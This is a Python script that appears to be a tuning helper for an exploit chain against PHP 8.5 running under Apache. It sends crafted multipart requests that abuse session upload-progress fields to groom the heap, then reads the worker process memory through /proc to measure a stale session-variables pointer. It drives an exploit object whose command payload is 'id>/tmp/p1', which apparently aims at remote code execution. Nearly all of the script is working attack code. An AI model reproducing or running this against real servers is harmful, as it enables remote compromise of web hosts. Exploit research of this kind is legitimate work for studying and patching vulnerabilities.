#!/usr/bin/env python3
"""Measure the stale PS(http_session_vars) reference after stage-3 A."""

from __future__ import annotations

import argparse
import os
import signal
import struct
import subprocess
import threading
import time

import exploit


MODULE = "/usr/lib/apache2/modules/libphp8.5.so"
PS_GLOBALS = 0x991FE0
PS_HTTP_SESSION_VARS = 0x168


def worker_pid(target: exploit.Target) -> int:
    for _ in range(40):
        output = subprocess.check_output(
            ["sh", "-c", "pgrep -P 1 apache2 | head -1"],
            text=True,
        ).strip()
        if output:
            pid = int(output)
            if os.path.exists(f"/proc/{pid}/maps"):
                return pid
        target.get("/")
        time.sleep(0.05)
    raise RuntimeError("Apache worker did not respawn")


def process_state(pid: int) -> str:
    with open(f"/proc/{pid}/stat", "r", encoding="ascii") as stat_file:
        return stat_file.read().split()[2]


def module_base(pid: int) -> int:
    with open(f"/proc/{pid}/maps", "r", encoding="ascii") as maps:
        for line in maps:
            if line.rstrip().endswith(MODULE):
                return int(line.split("-", 1)[0], 16)
    raise RuntimeError("libphp mapping not found")


def read_qword(pid: int, address: int) -> int:
    with open(f"/proc/{pid}/mem", "rb", buffering=0) as memory:
        memory.seek(address)
        return struct.unpack("<Q", memory.read(8))[0]


def request_body(ex: exploit.Exploit) -> bytes:
    parts = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for index, (name_length, value_length) in enumerate(ex.stage3_pads):
        name = (
            f"p{index:0{name_length - 1}d}" if name_length > 0 else ""
        )[:name_length]
        parts.append({"name": name, "data": b"V" * value_length})
    parts.extend([ex._file_part(), ex._big_field()])
    return exploit.build_multipart(parts, b"S" * 17)


def send_stage3_a(target: exploit.Target, body: bytes, pid: int) -> None:
    def send() -> None:
        target.post(
            body,
            b"S" * 17,
            read_cap=65536,
            timeout=40.0,
            extra_headers={"Cookie": "PHPSESSID=" + "a" * 32},
        )

    thread = threading.Thread(target=send, daemon=True)
    thread.start()
    while thread.is_alive():
        if process_state(pid) == "T":
            os.kill(pid, signal.SIGCONT)
        time.sleep(0.02)
    thread.join()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--start-pads", type=int, default=0)
    parser.add_argument("--max-pads", type=int, default=12)
    parser.add_argument("--step", type=int, default=1)
    parser.add_argument("--name-length", type=int, default=31)
    parser.add_argument("--value-length", type=int, default=31)
    parser.add_argument("--tail-name-length", type=int, default=8)
    parser.add_argument("--tail-value-length", type=int, default=0)
    parser.add_argument("--tail-count", type=int, default=0)
    args = parser.parse_args()

    target = exploit.Target("http://127.0.0.1/index.php", verbose=False)
    ex = exploit.Exploit(target, "id>/tmp/p1", profile="bookworm", verbose=False)

    for count in range(
        args.start_pads,
        args.max_pads + 1,
        args.step,
    ):
        pid = worker_pid(target)
        base = module_base(pid)
        ex.stage3_pads = [
            (args.name_length, args.value_length) for _ in range(count)
        ]
        ex.stage3_pads.extend(
            [(args.tail_name_length, args.tail_value_length)]
            * args.tail_count
        )
        send_stage3_a(target, request_body(ex), pid)
        time.sleep(0.1)
        r0 = read_qword(pid, base + PS_GLOBALS + PS_HTTP_SESSION_VARS)
        if not exploit.userspace_pointer(r0):
            print(f"pads={count} invalid_r0=0x{r0:x}", flush=True)
            continue
        chunk = r0 & ~0x1FFFFF
        words = []
        with open(f"/proc/{pid}/mem", "rb", buffering=0) as memory:
            memory.seek(r0)
            raw = memory.read(32)
        words = struct.unpack("<4Q", raw)
        print(
            f"pads={count} pid={pid} chunk=0x{chunk:x} "
            f"r0=0x{r0 - chunk:x} "
            f"q={'/'.join(hex(word) for word in words)}",
            flush=True,
        )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
